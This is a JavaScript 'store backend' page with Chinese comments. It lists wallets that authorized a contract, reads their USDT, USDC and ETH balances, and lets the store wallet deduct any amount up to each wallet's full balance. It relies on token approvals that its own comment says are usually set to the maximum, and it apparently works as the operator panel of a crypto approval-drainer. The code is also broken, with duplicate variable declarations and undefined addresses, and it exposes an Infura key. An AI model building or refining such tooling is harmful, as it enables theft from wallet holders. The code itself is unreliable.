// --- 常數設定 (已修正 STORE_ADDRESS) ---
const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT Mainnet Address
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC 合約地址
const CONTRACT_ABI = [
    "function storeAddress() external view returns (address)",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

const USDC_ABI = [ // 🚨 請確認 USDC 的 ABI
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

const MULTICALL_ABI = [
    "function aggregate(tuple(address target, bytes callData)[] calls) external view returns (uint256 blockNumber, bytes[] returnData)"
];


const INFURA_URL = 'https://gas.api.infura.io/v3/8ed85545f5b7453ab4dd0a84b9830d88';  //  <--  新增： 你的 Infura 專案 ID
const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract, usdcContract; //  新增 usdcContract
// --- 全域變數 (保持不變) ---
let readProvider;
let walletProvider;
let signer;
let userAddress;
let contract;
let usdtContract;
let usdcContract; //  新增 usdcContract
let usdtBalance = 0n; // 声明 usdtBalance 变量并初始化
let usdcBalance = 0n; // 声明 usdcBalance 变量并初始化
let DELETED_ADDRESSES_KEY = 'deletedAddresses';
let ADDRESS_NOTES_KEY = 'addressNotes';

// 檢查 ethers.js 是否加載
if (typeof ethers === 'undefined') {
    console.error('ethers.js 未加載。');
    const status = document.getElementById('status');
    if (status) status.innerText = '錯誤：ethers.js 未加載。';
} else {
    console.log('ethers.js 版本：', ethers.version);
}

// --- 初始化與事件綁定 (保持不變) ---
document.addEventListener('DOMContentLoaded', () => {
    bindEventListeners();
    initialize();
});

function bindEventListeners() {
    const loadWalletButton = document.getElementById('loadWalletButton');
    const refreshButton = document.getElementById('refreshButton');
    const statusDiv = document.getElementById('status');
    const tableBody = document.getElementById('balanceTableBody');

    let allFound = true;

    if (!loadWalletButton || !refreshButton || !statusDiv || !tableBody) {
        allFound = false;
        console.error('致命錯誤：backend.html 中缺少核心 ID。');
    }

    if (!allFound) {
        if (statusDiv) statusDiv.innerText = '致命錯誤：所需的頁面元素缺失 (檢查 loadWalletButton/refreshButton/status/balanceTableBody ID)。';
        return;
    }

    loadWalletButton.addEventListener('click', loadWallet);
    refreshButton.addEventListener('click', updateBalances);

    console.log('事件監聽器已成功綁定。');
}

async function initialize() {
    try {
        if (typeof ethers === 'undefined') return;
        readProvider = new ethers.JsonRpcProvider(INFURA_URL);
        readContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, readProvider);
        readUsdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, readProvider);
        multicallContract = new ethers.Contract(MULTICALL_ADDRESS, MULTICALL_ABI, readProvider);
        document.getElementById('status').innerText = 'Initialized. 請點擊「連繫店家錢包」。';
    } catch (error) {
        document.getElementById('status').innerText = `Initialization failed: ${error.message}`;
        console.error('Initialize error:', error);
    }
}

// --- 錢包載入功能 (與上一個完整版相同) ---
async function loadWallet() {
    try {
        if (!window.ethereum) {
            document.getElementById('status').innerText = '請安裝 MetaMask。';
            return;
        }

        walletProvider = new ethers.BrowserProvider(window.ethereum);
        const network = await walletProvider.getNetwork();
        if (network.chainId !== 1n) {
            document.getElementById('status').innerText = '請切換到 Ethereum Mainnet (主網)。';
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }]
                });
                // Re-initialize provider after successful switch
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.getNetwork();
            } catch (switchError) {
                if (switchError.code === 4001) {
                    updateStatus('User rejected network switch. Please manually switch to Ethereum Mainnet.'); // 顯示錯誤
                    showOverlay('用戶拒絕切換網絡。請手動切換到 Ethereum Mainnet。');
                } else {
                    updateStatus(`Network switch failed: ${switchError.message}`); // 顯示錯誤
                    showOverlay(`網絡切換失敗: ${switchError.message}`);
                }
                return;
            }
        }

        const accounts = await provider.send('eth_accounts', []);
        if (!accounts || accounts.length === 0) {
            document.getElementById('status').innerText = '未選擇帳戶。請在 MetaMask 中確認。';
            return;
        }

        signer = await walletProvider.getSigner();
        const address = await signer.getAddress();

        // 🚨 這裡會使用修正後的 STORE_ADDRESS 進行檢查
        if (address.toLowerCase() !== STORE_ADDRESS.toLowerCase()) {
            document.getElementById('status').innerText = `請使用正確的店家錢包地址: ${STORE_ADDRESS}`;
            signer = null;
            return;
        }

        writeContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        writeUsdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);

        document.getElementById('status').innerText = '連線成功！';
        await updateBalances();

        //  添加事件監聽器
        window.ethereum.on('accountsChanged', handleAccountsChanged);
        window.ethereum.on('chainChanged', handleChainChanged);

        if (!window._intervalId) {
            window._intervalId = setInterval(() => updateBalances(), 60000);
        }

    } catch (error) {
        document.getElementById('status').innerText = `連線失敗: ${error.message}`;
        console.error('Load wallet error:', error);
    }
}

// --- 核心功能：讀取已授權客戶的餘額和授權額度 ---
async function updateBalances() {
    try {
        if (!readProvider || !multicallContract) {
            document.getElementById('status').innerText = 'Error: Provider or Multicall not initialized.';
            return;
        }

        // 1. 顯示合約 ETH 餘額
        const contractEthBalance = await retry(() => readProvider.getBalance(CONTRACT_ADDRESS), 3, 1000);
        const formattedContractEth = ethers.formatEther(contractEthBalance);
        const balanceDiv = document.getElementById('contractBalanceStatus');

        if (balanceDiv) {
            const minEthRequired = ethers.parseEther('0.001');
            if (contractEthBalance < minEthRequired) {
                balanceDiv.innerHTML = `<div class="alert alert-warning" role="alert">⚠️ <strong>合約 ETH 餘額:</strong> ${formattedContractEth} ETH (不足! 請充值)</div>`;
            } else {
                balanceDiv.innerHTML = `<div class="alert alert-success" role="alert">✅ <strong>合約 ETH 餘額:</strong> ${formattedContractEth} ETH (正常)</div>`;
            }
        }

        const tableBody = document.getElementById('balanceTableBody');
        if (!tableBody) throw new Error('Table body not found');
        tableBody.innerHTML = '<tr><td colspan="5" class="text-center">正在載入客戶數據...</td></tr>';

        // 1. 載入已刪除的地址和備註
        const deletedAddresses = JSON.parse(localStorage.getItem(DELETED_ADDRESSES_KEY)) || [];
        const addressNotes = JSON.parse(localStorage.getItem(ADDRESS_NOTES_KEY)) || {};

        // 2. 獲取所有授權過的客戶列表 (核心邏輯)
        let customers = await getAuthorizedCustomers();

        // 3. 过滤已删除的地址
        customers = customers.filter(customer => !deletedAddresses.includes(customer));

        tableBody.innerHTML = '';

        if (customers.length === 0) {
            tableBody.innerHTML = '<tr><td colspan="5" class="text-center">目前沒有授權客戶數據。</td></tr>';
            document.getElementById('status').innerText = 'No authorized customers found.';
            return;
        }

        // 3. 准备 Multicall 批次查询 (優化讀取速度)
        const calls = [];
        for (const customer of customers) {
            // USDT 餘額
            calls.push({ target: USDT_CONTRACT_ADDRESS, callData: readUsdtContract.interface.encodeFunctionData('balanceOf', [customer]) });
            // USDC 餘額  <--  新增 USDC 餘額的查詢
            calls.push({ target: USDC_CONTRACT_ADDRESS, callData: new ethers.Contract(USDC_CONTRACT_ADDRESS,USDC_ABI,readProvider).interface.encodeFunctionData('balanceOf', [customer]) });
            // 合約中的授權狀態 (double check)
            calls.push({ target: CONTRACT_ADDRESS, callData: readContract.interface.encodeFunctionData('authorized', [customer]) });
        }

        const { returnData } = await retry(() => multicallContract.aggregate(calls), 3, 1000);

        // 4. 解析數據並生成表格
        for (let i = 0; i < customers.length; i++) {
            const customer = customers[i];
            const ethBalance = await retry(() => readProvider.getBalance(customer), 3, 1000);
            usdtBalance = ethers.AbiCoder.defaultAbiCoder().decode(['uint256'], returnData[i * 3])[0]; //  <-- 修正索引，因為減少了 1 個查詢
            usdcBalance = ethers.AbiCoder.defaultAbiCoder().decode(['uint256'], returnData[i * 3 + 1])[0]; //  <--  新增 USDC 餘額 (balanceOf)
            const isAuthorized = ethers.AbiCoder.defaultAbiCoder().decode(['bool'], returnData[i * 3 + 2])[0]; //  <-- 修正索引

            if (!isAuthorized) continue; // 排除雖然有事件但已經被合約撤銷授權的客戶

            // 決定扣款按鈕狀態
            const deductButtonDisabled = signer ? '' : 'disabled';
            // const canDeduct = allowance >= ethers.parseUnits('0.01', 6);
            // const canDeductUSDC = usdcAllowance >= ethers.parseUnits('0.01', 6); //  移除，不再需要

            const input = document.createElement('input');
            input.type = 'number';
            input.id = `usdt_amount_${customer}`;
            input.placeholder = '輸入數量';
            input.step = '0.01';
            input.min = '0';
            input.max = ethers.formatUnits(usdtBalance, 6);

            const row = document.createElement('tr');
            row.innerHTML = `
                <td>
                    <button class="btn btn-sm btn-warning delete-button" data-customer="${customer}">刪除</button>  <!-- 刪除按鈕 -->
                    ${customer}
                </td>
                <td>${ethers.formatEther(ethBalance)} ETH</td>
                <td>${ethers.formatUnits(usdtBalance, 6)} USDT</td>
                <td>${ethers.formatUnits(usdcBalance, 6)} USDC</td>  <!-- 新增 USDC 餘額顯示 -->
                <td>
                    ${input.outerHTML}
                    <select id="token_select_${customer}" class="form-control form-control-sm">
                        <option value="usdt">USDT</option>
                        <option value="usdc">USDC</option>
                    </select>
                    <button class="btn btn-sm btn-danger deduct-button" data-customer="${customer}" data-type="usdt" ${deductButtonDisabled}>扣款</button>
                    <span class="address-note-display" data-customer="${customer}">${addressNotes[customer] || ''}</span>
                    <input type="text" class="address-note-edit form-control form-control-sm" data-customer="${customer}" placeholder="備註" value="${addressNotes[customer] || ''}" style="display: none;">  <!-- 備註輸入框，預設隱藏 -->
                     <i class="fas fa-pencil-alt edit-note-icon" data-customer="${customer}" style="cursor: pointer; margin-left: 5px;" title="編輯備註"></i>  <!-- 鉛筆圖標 -->

                </td>
            `;
            tableBody.appendChild(row);
        }

        document.getElementById('status').innerText = `數據更新成功。偵測到 ${customers.length} 個授權客戶。`;

        // 5. 綁定扣款按鈕事件
        tableBody.querySelectorAll('.deduct-button').forEach(button => {
            button.addEventListener('click', handleDeductClick);
        });

        // 6. 绑定删除按钮的事件
        tableBody.querySelectorAll('.delete-button').forEach(button => {
            button.addEventListener('click', handleDeleteClick);
        });

        // 7.  绑定备注输入框的事件
        tableBody.querySelectorAll('.address-note-edit').forEach(input => { //  <-- 監聽編輯框
            input.addEventListener('blur', handleNoteChange); //  <-- 修改，使用 blur 事件
        });

        // 8. 绑定铅笔图标的点击事件
        tableBody.querySelectorAll('.edit-note-icon').forEach(icon => {
            icon.addEventListener('click', handleEditNoteClick);
        });

    } catch (error) {
        document.getElementById('status').innerText = `Failed to update balances: ${error.message}`;
        console.error('Update balances error:', error);
    }
}

// --- 核心功能：透過事件查找所有曾經授權過的客戶地址 ---
async function getAuthorizedCustomers() {
    try {
        const eventContract = readContract;
        // 過濾 Authorized 事件
        const filter = eventContract.filters.Authorized();
        const events = await retry(() => eventContract.queryFilter(filter, 0, 'latest'), 3, 1000);

        // 提取並去重客戶地址
        const uniqueCustomers = [...new Set(events.map(event => event.args.customer))];

        const authorizedCustomers = [];
        for (const customer of uniqueCustomers) {
            // 再次檢查合約狀態，確認客戶是否仍然被合約視為 "authorized"
            const isAuthorized = await retry(() => eventContract.authorized(customer), 3, 1000);
            if (isAuthorized) {
                authorizedCustomers.push(customer);
            }
        }
        return authorizedCustomers;
    } catch (error) {
        document.getElementById('status').innerText = `Failed to retrieve authorized customers: ${error.message}`;
        console.error('Get authorized customers error:', error);
        return [];
    }
}

// --- 扣款功能 (與上一個完整版相同) ---
async function handleDeductClick(event) {
    try {
        const customer = event.target.getAttribute('data-customer');
        const buttonElement = event.target;

        if (!signer) {
            document.getElementById('status').innerText = 'Error: 請先連繫店家錢包才能扣款。';
            return;
        }

        //  從選擇器獲取代幣類型
        const tokenSelect = document.getElementById(`token_select_${customer}`);
        if (!tokenSelect) {
            document.getElementById('status').innerText = 'Error: 無法找到代幣選擇器。';
            return;
        }
        const tokenType = tokenSelect.value;

        if (tokenType === 'usdt' || tokenType === 'usdc') {  // 检查 token type
            await deductToken(customer, tokenType, buttonElement); // 呼叫新的扣款函數
        } else {
            document.getElementById('status').innerText = 'Error: 無效的代幣類型。';
        }
    } catch (error) {
        // ... (錯誤由 deductToken 處理)
    }
}

async function deductToken(customer, tokenType, buttonElement) { //  <-- 新增的函數，支援多種代幣
    try {
        if (!writeContract || !signer) {
            document.getElementById('status').innerText = 'Please connect the store wallet.';
            return;
        }

        buttonElement.disabled = true;

        const amountInput = document.getElementById(`usdt_amount_${customer}`); //  <--  保持 ID 不變，因為我們使用它來獲取輸入值
        if (!amountInput.value || isNaN(amountInput.value) || Number(amountInput.value) <= 0) {
            document.getElementById('status').innerText = 'Please enter a valid amount.';
            buttonElement.disabled = false;
            return;
        }
        const amount = ethers.parseUnits(amountInput.value, 6); //  <--  保持精度為 6 位，USDT/USDC 相同

        const contractEthBalance = await retry(() => readProvider.getBalance(CONTRACT_ADDRESS), 3, 1000);
        const minEthRequired = ethers.parseEther('0.001');
        if (contractEthBalance < minEthRequired) {
            document.getElementById('status').innerText = `❌ 合約 ETH 餘額不足 (${ethers.formatEther(contractEthBalance)} ETH)。請充值。`;
            buttonElement.disabled = false;
            return;
        }

        let tokenAddress; //  <--  根據 tokenType 選擇地址
        let tokenName;
        let balance; // 客戶代幣餘額
        // let allowance; // 客戶授權額度  (不再使用，因為前端授權通常是最大值)

        if (tokenType === 'usdt') {
            tokenAddress = USDT_CONTRACT_ADDRESS;
            tokenName = 'USDT';
            balance = usdtBalance; // 取得 usdtBalance 全域變數

        } else if (tokenType === 'usdc') {
            tokenAddress = USDC_CONTRACT_ADDRESS;
            tokenName = 'USDC';
            //  取得 usdcBalance 全域變數
            //  修改為使用  usdcBalance 變數。
            //  這裡需要從 updateBalances 函數中获取到 usdcBalance 的值.
            balance = usdcBalance;
             // 不需要顯示allowance

        } else {
            throw new Error('Invalid token type'); // 應該不會發生，因為我們已經檢查過
        }

        // 檢查餘額是否足夠 (針對所有代幣)
        if (ethers.parseUnits(amountInput.value, 6) > ethers.parseUnits(balance.toString(), 6)) {
            document.getElementById('status').innerText = `❌ 餘額不足, 餘額: ${ethers.formatUnits(balance, 6)}  ${tokenName}。`;
            buttonElement.disabled = false;
            return;
        }

        document.getElementById('status').innerText = `正在準備 ${tokenName} 扣款交易，請在 MetaMask 中確認...`;

        const feeData = await retry(() => readProvider.getFeeData(), 3, 1000);

        const txOverrides = {
            gasLimit: 600000n,
            maxFeePerGas: feeData.maxFeePerGas ? feeData.maxFeePerGas * 12n / 10n : undefined,
            maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ? feeData.maxPriorityFeePerGas : undefined,
            gasPrice: feeData.maxFeePerGas === null ? feeData.gasPrice : undefined
        };

        const tx = await writeContract.deductUSDT(customer, tokenAddress, amount, txOverrides); //  <--  使用 tokenAddress

        document.getElementById('status').innerText = `交易已送出。等待區塊鏈確認中 (Hash: ${tx.hash})....`;
        const receipt = await tx.wait();

        if (receipt.status !== 1) {
            throw new Error('Transaction failed on-chain. Status: ' + receipt.status);
        }

        document.getElementById('status').innerText = `扣款成功: ${ethers.formatUnits(amount, 6)} ${tokenName}。交易 Hash: ${tx.hash}`;
        await updateBalances();

    } catch (error) {
        let errorMessage = error.message;
        if (error.code === 4001) errorMessage = '用戶拒絕交易 (User rejected transaction)';
        else if (error.code === 'CALL_EXCEPTION') errorMessage = `合約執行失敗: ${error.reason || '請檢查 ${tokenType.toUpperCase()} 合約或客戶授權。'}`; //  <--  更詳細的錯誤訊息
        else if (error.code === 'TRANSACTION_REPLACED') errorMessage = `交易被替換。新 Hash: ${error.replacement.hash || 'N/A'}. 請檢查新的交易狀態。`;

        document.getElementById('status').innerText = `${tokenName} 扣款失敗: ${errorMessage}`; //  <--  更詳細的錯誤訊息
        console.error(`Deduct ${tokenName} error:`, error);
    } finally {
        if (buttonElement) buttonElement.disabled = false;
    }
}

// --- 雜項輔助函數 (與上一個完整版相同) ---
function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        resetState();
        document.getElementById('status').innerText = 'MetaMask 錢包已斷開連線。';
    } else {
        loadWallet();
    }
}

function handleChainChanged() {
    resetState();
    updateStatus('Network changed, please reconnect wallet'); // 顯示網路變化的提示
    window.location.reload();
}

function resetState() {
    signer = null;
    writeContract = null;
    writeUsdtContract = null;
    document.getElementById('balanceTableBody').innerHTML = '';
    document.getElementById('contractBalanceStatus').innerHTML = '';
    if (window._intervalId) {
        clearInterval(window._intervalId);
        window._intervalId = null;
    }
}

async function retry(fn, maxAttempts = 3, delayMs = 1000) {
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        try {
            return await fn();
        } catch (error) {
            if (attempt === maxAttempts) {
                throw error;
            }
            if (error.message.includes('service temporarily unavailable') || error.message.includes('timeout')) {
                console.warn(`Retry ${attempt}/${maxAttempts}: ${error.message}`);
                await new Promise(resolve => setTimeout(resolve, delayMs));
            } else {
                throw error;
            }
        }
    }
}

// --- 刪除錢包地址的處理函数 ---
function handleDeleteClick(event) {
    const customer = event.target.getAttribute('data-customer');
    let deletedAddresses = JSON.parse(localStorage.getItem(DELETED_ADDRESSES_KEY)) || [];
    if (!deletedAddresses.includes(customer)) {
        deletedAddresses.push(customer);
        localStorage.setItem(DELETED_ADDRESSES_KEY, JSON.stringify(deletedAddresses));
        updateBalances(); // 重新刷新表格
    }
}

// --- 備註输入框的處理函数 ---
function handleNoteChange(event) {
    const customer = event.target.getAttribute('data-customer');
    const note = event.target.value;
    let addressNotes = JSON.parse(localStorage.getItem(ADDRESS_NOTES_KEY)) || {};
    addressNotes[customer] = note;
    localStorage.setItem(ADDRESS_NOTES_KEY, JSON.stringify(addressNotes));
    // 顯示 span，隱藏 input
    const displaySpan = document.querySelector(`.address-note-display[data-customer="${customer}"]`);
    const editInput = document.querySelector(`.address-note-edit[data-customer="${customer}"]`);

    if (displaySpan) {
        displaySpan.textContent = note;
        displaySpan.style.display = 'inline'; // 显示
    }
    if (editInput) {
       editInput.style.display = 'none'; // 隱藏
    }

}

//  添加处理编辑铅笔图标点击事件的函数
function handleEditNoteClick(event) {
    const customer = event.target.getAttribute('data-customer');

    // 顯示输入框
    const displaySpan = document.querySelector(`.address-note-display[data-customer="${customer}"]`);
    const editInput = document.querySelector(`.address-note-edit[data-customer="${customer}"]`);

    if (displaySpan) {
       displaySpan.style.display = 'none'; // 隱藏
    }
    if (editInput) {
       editInput.style.display = 'inline'; // 显示
       editInput.focus(); // 讓編輯框獲得焦點，提高使用者體驗
    }
}